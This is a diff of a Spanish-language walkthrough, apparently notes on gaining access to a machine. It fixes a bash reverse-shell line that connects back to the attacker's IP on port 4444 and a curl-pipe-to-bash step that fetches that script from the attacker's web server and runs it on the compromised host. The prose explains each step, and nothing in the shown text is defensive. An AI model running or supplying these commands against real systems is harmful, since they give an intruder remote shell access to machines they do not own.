@@ -7,7 +7,7 @@
 ```
 #! /bin/bash
 
-bash -i >0 /dev/tcp/<mi ip(del atacante)>/4444 0>&1
+bash -i >& /dev/tcp/<mi ip(del atacante)>/4444 0>&1
 ```
 Este comando crea un archivo index.html con un script de bash que establece una conexión de "reverse shell" hacia tu máquina atacante en el puerto 4444.
 
@@ -20,7 +20,7 @@ Esto iniciará un servidor HTTP en el puerto 80 de tu máquina, que servirá el 
 4. **Ejecución del comando curl desde el sistema comprometido:** Desde el sistema comprometido, ejecutas el siguiente comando curl para descargar y ejecutar el archivo index.html:
 
 ```
-curl <mi_ip_del_atacante>:80/index.html | bash
+curl <mi_ip_del_atacante>:80 | bash
 ```
 
 Esto descarga el archivo index.html desde tu máquina atacante y lo pasa al comando bash para su ejecución, lo que establecerá la conexión de "reverse shell".
